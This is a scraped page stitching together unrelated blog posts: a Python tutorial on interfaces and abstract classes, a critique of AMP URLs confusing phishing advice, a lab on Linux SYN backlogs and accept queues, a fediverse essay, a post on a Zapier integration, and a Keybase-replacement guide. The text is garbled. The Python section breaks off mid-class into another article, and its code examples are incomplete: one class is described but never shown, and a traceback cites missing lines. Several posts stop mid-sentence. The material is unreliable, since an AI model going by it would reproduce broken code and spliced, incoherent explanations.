<h2 id="concept-edifice">
Concept Edifice</h2>

<p>To understand how all these work, you’ll need a fair bit of knowledge about Interfaces, Abstract Base Classes, Mixin Classes etc. I’ll build the concept edifice layer by layer where you’ll learn about interfaces first and how they can be created and used via the <code>abc.ABC</code> class. Then you’ll learn how abstract base classes differ from interfaces. After that I’ll introduce mixins and explain how all these concepts can be knitted together to architect custom data structures with amazing capabilities. Let’s dive in.</p>

<h2 id="interfaces">
Interfaces</h2>

<p>Python interfaces can help you write classes based on common structures. They ensure that classes that provide similar functionalities will also have similar footprints. Interfaces are not as popular in Python as they are in other statically typed language. The dynamic nature and duck-typing capabilities of Python often make them redundant.</p>

<p>However, in larger applications, interfaces can make you avoid writing code that is poorly encapsulated or build classes that look awfully similar but provide completely unrelated functionalities. Moreover, interfaces implicitly spawn other powerful techniques like mixin classes which can help you achieve DRY nirvana.</p>

<h3 id="overview">
Overview</h3>

<p>At a high level, an interface acts as a blueprint for designing classes. In Python, an interface is basically a specialized abstract class that defines one or more abstract methods. Abstract classes differs from concrete classes in the sense that they aren’t intended to stand on their own and the methods they define shouldn’t have any implementation.</p>

<p>Usually, you inherit from an interface and implement the methods defined in the abstract class in a concrete subclass. Interfaces provide the skeletons and concrete classes provide the implementation of the methods based on those skeletons. Depending on the ways you can architect interfaces, they can be segmented into two primary categories.</p>

<ul>
  <li>Informal Interfaces</li>
  <li>Formal Interfaces</li>
</ul>

<h2 id="informal-interfaces">
Informal Interfaces</h2>

<p>Informal interfaces are classes which define methods that can be overridden, but there’s no strict enforcement.</p>

<p>Let’s write an informal interface for a simple calculator class:</p>

<div><div><pre><code><span>class</span> <span>ICalc</span><span>:</span>
    <span>"""Informal Interface: Abstract calculator class."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>mul</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>div</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>
</code></pre></div></div>

<p>Notice that the <code>ICalc</code> class has four different methods that don’t give you any implementation. It’s an informal interface because you can still instantiate the class but the methods will raise <code>NotImplementedError</code> if you try to apply them. You’ve to subclass the interface to use it. Let’s do it:</p>

<div><div><pre><code><span>class</span> <span>Calc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Calculator"""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

<p>Now, you might be wondering why you even need all of these boilerplate code and inheritance when you can directly define the concrete <code>Calc</code> class and call it a day.</p>

<p>Consider the following scenario where you want to add additional functionalities to each of the method of the <code>Calc</code> class. Here, you’ve two options. Either you can mutate the original class and add those extra functionalities to the methods or you can create another class with similar footprint and implement all the methods with the added functionalities.</p>

<p>The first option isn’t always viable and can cause regression in real life scenario. The second approach ensures modularity and is generally quicker to implement since you won’t have to worry about messing up the original concrete class. However, figuring out which methods you’ll need to implement in the extended class can be hard because the concrete class might have additional methods that you don’t want in the extended class.</p>

<p>In this case, instead of figuring out the methods from the concrete <code>Calc</code> class, it’s easier to do so from an established structure defined in the <code>ICalc</code> interface. Interfaces make the process of extending class functionalities more tractable. Let’s make another class that will add logging to all of the methods of the <code>Calc</code> class:</p>

<p>In the above class, I’ve defined another class called <code>CalcLog</code> that basically extends the functionalities of the previously defined <code>Calc</code> class. Here, I’ve inherited from the informal interface <code>ICalc</code> and implemented all the methods with additional info logging capability.</p>

<p>Although writing informal interfaces is trivial, there are multiple issues that plagues them. The user of the interface class can still instantiate it like a normal class and won’t be able to tell the difference between a it and a concrete class until she tries to use any of the methods define inside the interface. Only then the methods will throw exceptions. This can have unintended side effects.</p>

<p>Moreover, informal interfaces won’t compel you to implement all the methods in the subclasses. You can easily get away without implementing a particular method defined in the interface. It won’t complain about the unimplemented methods in the subclasses. However, if you try to use a method that hasn’t been implemented in the subclass, you’ll get an error. This means even if <code>issubclass(ConcreteSubClass, Interface)</code> shows <code>True</code>, you can’t rely on it since it doesn’t give you the guarantee that the <code>ConcreteSubClass</code> has implemented all the methods defined in the <code>Interface</code>.</p>

<p>Let’s create another class <code>FakeCalc</code> an only implement one method defined in the <code>ICalc</code> abstract class:</p>

<div><div><pre><code><span>class</span> <span>FakeCalc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Fake calculator that doesn't implement all the methods
    defined in the interface."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

<span>print</span><span>(</span><span>cfake</span><span>.</span><span>sub</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>))</span>
</code></pre></div></div>

<div><div><pre><code>3

---------------------------------------------------------------------------

NotImplementedError                       Traceback (most recent call last)

&lt;ipython-input-48-035c519cee55&gt; in &lt;module&gt;
        10 cfake = FakeCalc()
        11 print(cfake.add(1,2))
---&gt; 12 print(cfake.sub(2,3))

        9
        10     def mul(self, a, b):


NotImplementedError:
</code></pre></div></div>

<p>Despite not implementing all the methods defined in the <code>ICalc</code> class, I was still able to instantiate the <code>FakeCalc</code> concrete class. However, when I tried to apply a method <code>sub</code> that wasn’t implemented in the concrete class, it gave me an error. Also, <code>issubclass(FakeCalc, ICalc)</code> returns <code>True</code> which can mislead you into thinking that all the methods of the subclass <code>FakeCalc</code> are usable. It can cause subtle bugs can be difficult to detect. Formal interfaces try to overcome these issues.</p>

<h2 id="formal-interfaces">
Formal Interfaces</h2>

<p>Formal interfaces do not suffer from the problems that plague informal interfaces. So if you want to implement an interface that the users can’t initiate independently and that forces them to implement all the methods in the concrete sub classes, formal interface is the way to go. In Python, the idiomatic way to define formal interfaces is via the <code>abc</code> module. Let’s transform the previously mentioned <code>ICalc</code> interface into a formal one:</p>

<div><div><pre><code><span>from</span> <span>abc</span> <span>import</span> <span>ABC</span><span>,</span> <span>abstractmethod</span>


<span>class</span> <span>ICalc</span><span>(</span><span>ABC</span><span>):</span>

    <section>
        <p>Take a look at the below screenshot from Safari for iOS. What website am I on?</p>

<p><img src="https://theinternetbytes.com/images/amp-nytimes-example.png" alt="AMP Example with NYTimes"></p>

<p>Based on the contents of the page, I’m clearly on a NYTimes property, but based
on the address bar I’m clearly on <code>google.com</code>. If I click in the address bar
I see <code>https://www.google.com/amp/s/www.nytimes.com/2020/05/22/technology/google-antitrust.amp.html</code>. Confused, I consult <a href="https://www.google.com/safebrowsing/static/faq.html">Google’s Safebrowsing FAQ</a>:</p>

<blockquote>
<p><strong>How can I tell if a page is a fake?</strong></p>

<p>The best thing to do is to check the page’s URL to make sure it’s actually controlled by the party it appears to be controlled by. The crucial part of the URL is the part between the http:// and the next slash (‘/’). (If there’s no slash, start at the end of the URL.) This is the part of the URL that determines site ownership. Some popular domains, for instance, are amazon, google, and ebay:</p>

<p><code>http://www.amazon.com</code><br>
<code>http://www.google.com</code><br>
<code>http://www.ebay.com</code></p>

<p>In some cases, URLs will be a bit more complex; be sure to check the name listed immediately to the left of the top level domain (.com, .net, .co.uk, etc.).
For instance, <code>http://www.google.com</code>, <code>http://news.google.com</code> and <code>http://www.google.com/firefox/</code> are all part of the same site. However, <code>google.com.fraudulentdomain.com/login.html</code> is NOT! Neither is <code>www.g00gle.com</code> (note that in this URL, the letter o is replaced by the number 0).</p>
</blockquote>

<p>and determine I’m on <code>www.google.com</code>—but the confusion remains since
this is genuinely NYTimes content and branding.</p>

<p>This is a really dangerous pattern: Google serves NYTimes’ controlled<sup id="fnref:1"><a href="#fn:1">1</a></sup>
content on a Google domain (<code>www.google.com</code>) and wants the user to trust that it is NYTimes’ content. <strong>It confuses the user whether to trust the address in
URL bar or the content of the page</strong> Meanwhile Google, Internet safety groups, and workplaces actively try to
teach users to check domains and URL address bars. The confusion over trusting page content or address bar contents is precisely why phishing
attempts work so well. Humans trust visual indicators a lot. Google, with the AMP
Cache Project, is confusing humans more and training them to trust visual content
of the page over the URL in the address bar (in certain contexts)—despite telling them to do otherwise on different sites.
This surprises me since Google
spends a lot of time researching visual indicators of security in the address bar
(like the padlock icon)<sup id="fnref:2"><a href="#fn:2">2</a></sup>. In work security trainings and guides on the Internet,
we are trained to look at the address bar to help make a decision on whether to trust
a site, but the Google AMP Cache requires contradictory rules from what we’d use elsewhere.</p>

<p>The speed of AMP is a nice benefit<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there are still some UX challenges to handle in order
to reinforce—not muddy—the security lessons we teach Internet users.</p>

    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<p>Unlike the SYN backlog, the accept queue has no backup plan for when it overflows. Back in the original call to <code>listen()</code>, a <code>backlog</code> argument was provided, which indicates how many connections can have completed the 3-way handshake and be waiting in the kernel for the application to accept.</p>

<p>This is the first common issue: If the <code>backlog</code> number provided to <code>listen()</code> is not large enough to contain any number of connections that could reasonably complete their handshake between 2 calls to <code>accept()</code>, then a connection will be dropped on the floor, and the application generally won’t even notice - the next call to …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>That's the plan, right? A whole new world awaits you on the fediverse, and you are going to make it there! There's something you should know.</p>
<!--more-->
<h2>Welcome to the Fediverse</h2>
<p>Whenever I talk to people in my surroundings about the fediverse and try to convince them to use it, I have a go-to story that I tell. On multiple occasions in the past, there have been real-life events that sparked controversy on Twitter which then responded by banning some public figure or doing something else to upset a portion of the population. In turn, this would lead to either that public figure or a social movement to incite people to leave Twitter and join a safer and more open alternative: the fediverse. As citizens of the fediverse, we would notice a massive influx of new users and a stream of introductory messages on our timelines. Which, in my humble opinion, is always a welcome sight. An interesting observation is that the first message by these new citizens is often a little… "off" if you are used to being on the fediverse.</p>
<p>Allow me to elaborate. The introductory message of Twitter exiles often reads as follows: "Hello all! I am [insert name here], I am going to post messages about [insert multiple topics here]. Who are the people I should follow?".</p>
<p>The message above oozes "Twitter Mentality". To explain what I mean, let me use an analogy.</p>
<h2>The analogy</h2>
<p>Twitter is a metropole. Its users all share the same playing field. If you want to participate, you don't talk, you shout. How else are you going to be heard in a crowd of millions? Once you start shouting, quiet people start to listen. This creates a one-to-many dynamic.</p>
<p>The fediverse is a network of well-connected villages. As part of a village, you get to know people. You talk to people because it's less crowded, there's less competition. It's still a network so you can connect to people multiple villages away with the same ease. But the noise is filtered. You are surrounded by people who share a common interest which is the reason you decided to live in that specific village in the first place, but you still get the network effect and communicate with people outside of the village because you want to, because you can. This creates a one-to-one or on a larger scale, many-to-many dynamic.</p>
<h2>What makes a network social?</h2>
<p>My argument is that a one-to-many network is not a social network, it's broadcasting. Having "influencers" on a network is, if anything, anti-social. This is where I need to go back to that initial message by the Twitter exile. There's no need to announce you are going to talk about a certain topic, just do it. I will not follow you because you are announcing to post messages about a certain topic. Post a message, let's debate and talk about it and if I am truly interested in your opinion and reasonings, only then will I follow you. And don't follow people because many others do; follow them because you want to, because you get the choice.</p>
<p>This is my opinion and I have talked to many sharing the same sentiment. This many-to-many dynamic is what makes the fediverse appealing. You get a Home timeline where you will find posts from people you follow and actually want to hear from. You get a Local Timeline filled with posts from people you don't always know, but it's the same instance/village, so you already share a common ground. And for when you feel like exploring, you get a Known Network timeline filled with all sorts of posts.</p>
<p>You may argue that building this whole narrative around a simple introductory post is flimsy, and I agree. Not everyone's first post is like that, and even if it were, there are different ways of interpreting the content. But it's something I found people can relate to, it's a bridge between two mentalities, two social structures that I can use to introduce the many advantages of the fediverse.</p>
<p>If you would like actually useful information on starting with the fediverse with Mastodon, please have a look at this <a href="https://kevq.uk/how-does-mastodon-work/">blog post by KevQ</a>.</p></div></div>]]>

July 3, 2020 | https://formcake.com/blog/integrating-with-zapier | <a href="https://web.archive.org/web/*/https://formcake.com/blog/integrating-with-zapier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We <em>just</em> launched our integration with Zapier and have some thoughts to share on the process.</p>
<p>If you haven't heard of Zapier then you've probably never been asked to integrate your company’s API to a 3rd party product “as quickly as possible.” Zapier has become the API platform for the web and - as a company who takes in data and sheperds it through to other workflows - it was a no brainer to integrate Formcake with Zapier. Integration was straightforward enough, but still a bit of a journey, so hopefully these details that may interest those looking to do the same and shorten their learning curve a bit.</p>
<p>So what does Zapier ask from its integration partners? And what decisions did we have to make accommodate those requirements? Here is our list of top concerns.</p>
<h2 id="1-authenticating-with-zapier">1) Authenticating with Zapier</h2>
<p>Zapier obviously needs a way to communicate with your app. The two options that we considered were OAuth2 and JTW tokens. We love OAuth2 with all of its control and flexibility. Honestly it would have been a great choice for Zapier. We however ended up choosing JWT instead. With OAuth2's power comes complexity and as a small SaaS app we wanted to keep things simple. Yes, having the user connect Zapier to Formcake would have been a little more straightforward, but we also knew that we did not want to use OAuth2 for our forthcoming user API. This API will allow users to access their data simply and securely and if you have ever had to use OAuth2 for an API where you just want to make a GET request, you many identify with our thinking. In our case, we adopted a new, Zapier-specific JWT strategy that lives alongside our existing JWT auth system.</p>
<p>With our new JWT auth token system, Formcake users can navigate to API Keys, create a Zapier API Key, and plug it into Zapier. They can also see the last time a key was used and can revoke those keys that are no longer needed or have become compromised. This worked particularly well for us because it dovetails nicely into the necessary infrastructure for our user API and we think our users will appreciate the simple process of passing a JTW token with API requests. It will also be extensible should we want to integrate more tightly with any other systems in the future.</p>

<h3 id="logging-into-formcake">Logging Into Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-key-login.png" alt="Logging into formcake"></p>
<h2 id="2-polling-vs-webhook-trigger">2) Polling vs Webhook Trigger</h2>
<p>When you are setting up your Zapier integration, you have the option to create one of two types of "Triggers". You can either have Zapier regularly poll an endpoint in your API and then propagate any new changes it finds, or you can communicate with Zapier via webhooks, pushing out anything new on your end and triggering an immediate response.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-trigger-types.png" alt="Zapier polling vs webhook trigger options"></p>
<p>Of course for something like a form, the webhook method is critical, since when your form receives a submission you want it to, you know, <em>do</em> something, instead of quietly waiting for Zapier to get in touch. For those considering these options, know that creating a webhook system is not always the right choice. Creating a Polling Trigger is far more simple than creating a Webook Trigger. For data that does not change very often or has a limited set of data, polling can get your integration off the ground much faster and may be you all that you ever need. For Formcake's purposes, we knew that users would want to see something happen in Zapier immediately, especially when first creating and debugging their integration. A form could also have thousands of submissions, making polling simply not an option since Zapier would have to poll all submissions each time, creating a slower and slower process as our users get more and more value out of their forms.</p>
<h2 id="3-enable--disable">3) Enable / Disable</h2>
<p>Note that even with the webhook system in place, where we send data to Zapier instead of Zapier hitting our API, we still need to provide Zapier a way to authenticate with our app beyond simply logging the user in. This is because Zapier requires something else - a way to enable and disable webooks within our app. Zapier asks that you provide <code>/subscribe</code> and <code>/unsubscribe</code> endpoints that will turn your webhooks on and off. The <code>/subscribe</code> endpoint is meant to activate your webhook and also provide a webhook url to send your data to Zapier. This webhook url corresponds to a Zap in Zapier. The <code>/unsubscribe</code> endpoint simply turns off your webhook.</p>
<p>Within Formcake, these endpoints toggle an action's <code>active</code> property and also store the Zapier webhook url. On our own end, we use the <code>active</code> property in our own app frontend so that users can see on both platforms whether a Zap has been successfully connected. Zapier requires unsubscribing so that your app does not send data to Zapier after a Zap has been paused or deleted. Can you imagine the amount of unuseful API requests Zapier would recieve if they did not reserve the right to turn off your app's webhooks?</p>

<p><img src="https://formcake.com/images/blog-posts/zapier-connected-to-action.png" alt="Zapier connected"></p>
<h2 id="4-preform-list-trigger">4) "Preform List" Trigger</h2>
<p>After giving Zapier a way to enable or disable your webhooks, your app also needs to provide a way to pull an example of whatever data your app will send to Zapier. This is accomplished in Zapier by using a Polling Trigger, but one that is not visible to the public and is only meant for other Zapier Triggers to use in order to get a list of information. In Zapier this is called a "Preform List" endpoint and is entirely optional. We would advise those making an integration use this option since it makes your Zapier integration far more useful. For Formcake, this endpoint returns a form's last 5 submissions.</p>

<p><img src="https://formcake.com/images/blog-posts/zapier-preform-list.png" alt="Zapier preform list"></p>
<h2 id="5-marketing-your-integration-beta-to-searchable">5) Marketing Your Integration (Beta to Searchable)</h2>
<p>After you are satisfied with your Zapier integration, you then need to develop a launch strategy in order to get your integration approved. Anyone is allowed to create a private integration but in order to have your integration publicly searchable on Zapier you have to satisfy a couple of requirements. Some of these are practical like providing a support contact so that Zapier can pass along support requests, but the real hurtle is getting 50 users to start using the integration. Zapier gives you access to a link that allows you to invite users to your integration. With this link users can beta test your Zap and you can tweak it to your users needs before submitting it to Zapier.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-share-page.png" alt="Zapier preform list"></p>
<h2 id="next-steps">Next Steps</h2>
<p>Formcake's Zapier integration is currently in beta so go ahead and <a href="https://formcake.com/documentation/actions#zapier-action">try it out</a>! Formcake's free plan nicely syncs up with Zapier's where each allow you 100 free submissions per month. If you have any feedback for the integration, please reach out to us at <a href="mailto:contact@formcake.com">contact@formcake.com</a>.</p>

It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian 